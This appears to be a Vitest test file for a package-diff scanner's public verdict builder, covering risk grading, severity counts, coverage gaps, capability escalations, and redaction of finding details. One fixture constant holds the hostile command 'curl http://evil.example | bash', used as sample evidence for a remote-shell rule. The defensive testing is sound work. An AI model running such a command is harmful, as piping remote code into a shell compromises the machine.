import { describe, expect, test } from "vitest";
import type { PublicPackageDiff } from "../server/lib/public-diff";
import { buildPublicDiffVerdict, PUBLIC_VERDICT_SCHEMA } from "../server/lib/public-diff/verdict";
import { diffCapabilities, projectCapabilities } from "../server/lib/review/capabilities";
import type { Finding, FindingDiffAnnotation, RiskLevel } from "../server/lib/review";

const SECRET_EVIDENCE = "curl http://evil.example | bash";
const SECRET_REASON = "shell command with network capability";

function finding(severity: Finding["severity"]): Finding & FindingDiffAnnotation {
  return {
    severity,
    file: "index.js",
    evidence: SECRET_EVIDENCE,
    reason: SECRET_REASON,
    ruleId: "code.remote-shell",
    diffStatus: "modified",
    releaseDelta: true,
  };
}

function payload(overrides: Partial<PublicPackageDiff> = {}): PublicPackageDiff {
  return {
    ecosystem: "npm",
    packageName: "example",
    fromVersion: "1.2.3",
    toVersion: "1.2.4",
    fromPackageJson: null,
    toPackageJson: null,
    fromFiles: [],
    toFiles: [],
    diff: [],
    packageJsonDiff: {
      name: "example",
      hasPreviousManifest: true,
      previousVersion: "1.2.3",
      stagedVersion: "1.2.4",
      scripts: [],
      dependencies: [],
      bin: [],
      entrypointsChanged: false,
    },
    findings: [],
    risk: {
      artifactRisk: "low",
      releaseRisk: "low",
      contextRisk: "low",
      releaseFindingCount: 0,
      contextFindingCount: 0,
      unknownFindingCount: 0,
      priorApprovedContextFindingCount: 0,
    },
    capabilities: diffCapabilities(projectCapabilities([], null), projectCapabilities([], null)),
    fromPublishedAt: "2026-01-01T00:00:00.000Z",
    toPublishedAt: "2026-08-01T00:00:00.000Z",
    sourceBinding: {
      from: "https://github.com/owner/repo",
      to: "https://github.com/owner/repo",
      changed: false,
    },
    cachedAt: "2026-08-26T00:00:00.000Z",
    ...overrides,
  };
}

const OPTIONS = {
  rulesVersion: "1.28.0+risk-1",
  diffUrl: "https://drydock.org/diff/example/1.2.3/1.2.4",
};

function withRisk(artifactRisk: RiskLevel, releaseRisk: RiskLevel): PublicPackageDiff {
  return payload({
    risk: {
      artifactRisk,
      releaseRisk,
      contextRisk: "low",
      releaseFindingCount: 0,
      contextFindingCount: 0,
      unknownFindingCount: 0,
      priorApprovedContextFindingCount: 0,
    },
  });
}

describe("buildPublicDiffVerdict", () => {
  test("projects identity, versions, timestamps, and analysis version", () => {
    const verdict = buildPublicDiffVerdict(payload(), OPTIONS);
    expect(verdict.schema).toBe(PUBLIC_VERDICT_SCHEMA);
    expect(verdict.package).toBe("example");
    expect(verdict.from).toEqual({ version: "1.2.3", publishedAt: "2026-01-01T00:00:00.000Z" });
    expect(verdict.to).toEqual({ version: "1.2.4", publishedAt: "2026-08-01T00:00:00.000Z" });
    expect(verdict.rulesVersion).toBe("1.28.0+risk-1");
    expect(verdict.diffUrl).toBe(OPTIONS.diffUrl);
    expect(verdict.computedAt).toBe("2026-08-26T00:00:00.000Z");
  });

  test("grade folds artifact and release risk and caps at needs-review", () => {
    expect(buildPublicDiffVerdict(withRisk("low", "low"), OPTIONS).grade).toBe("clear");
    expect(buildPublicDiffVerdict(withRisk("medium", "low"), OPTIONS).grade).toBe("notable");
    expect(buildPublicDiffVerdict(withRisk("low", "medium"), OPTIONS).grade).toBe("notable");
    expect(buildPublicDiffVerdict(withRisk("high", "low"), OPTIONS).grade).toBe("needs-review");
    // The anonymous plane has no stronger word than needs-review, by design.
    expect(buildPublicDiffVerdict(withRisk("critical", "critical"), OPTIONS).grade).toBe(
      "needs-review",
    );
  });

  test("counts findings by severity without carrying their text", () => {
    const verdict = buildPublicDiffVerdict(
      payload({ findings: [finding("critical"), finding("medium"), finding("medium")] }),
      OPTIONS,
    );
    expect(verdict.findingCounts).toEqual({ critical: 1, high: 0, medium: 2, low: 0, info: 0 });
  });

  test("never leaks finding evidence, reasons, or rule ids", () => {
    // The posture invariant behind the whole endpoint: a verdict automates
    // public statements at scale, so rule prose must not survive projection.
    const serialized = JSON.stringify(
      buildPublicDiffVerdict(payload({ findings: [finding("high")] }), OPTIONS),
    );
    expect(serialized).not.toContain(SECRET_EVIDENCE);
    expect(serialized).not.toContain(SECRET_REASON);
    expect(serialized).not.toContain("code.remote-shell");
  });

  test("coverage reports per-side uninspected counts and notices", () => {
    const withGaps = payload({
      capabilities: diffCapabilities(
        projectCapabilities([], null),
        projectCapabilities(
          [{ path: "blob", size: 10, sha256: "x", flags: ["content-skipped"] }],
          null,
        ),
      ),
      notices: ["sdist omitted: exceeded the sandbox byte budget"],
    });
    const verdict = buildPublicDiffVerdict(withGaps, OPTIONS);
    expect(verdict.coverage).toEqual({
      fromUninspectedFiles: 0,
      toUninspectedFiles: 1,
      notices: ["sdist omitted: exceeded the sandbox byte budget"],
    });
    expect(verdict.capabilities.confident).toBe(false);
  });

  test("passes the capability delta and source binding through unchanged", () => {
    const capabilities = diffCapabilities(
      projectCapabilities([], null),
      projectCapabilities([], { scripts: { postinstall: "node x.js" } }),
    );
    const verdict = buildPublicDiffVerdict(payload({ capabilities }), OPTIONS);
    expect(verdict.capabilities).toEqual(capabilities);
    expect(verdict.capabilities.escalations).toEqual(["installScripts"]);
    expect(verdict.sourceBinding).toEqual({
      from: "https://github.com/owner/repo",
      to: "https://github.com/owner/repo",
      changed: false,
    });
  });
});
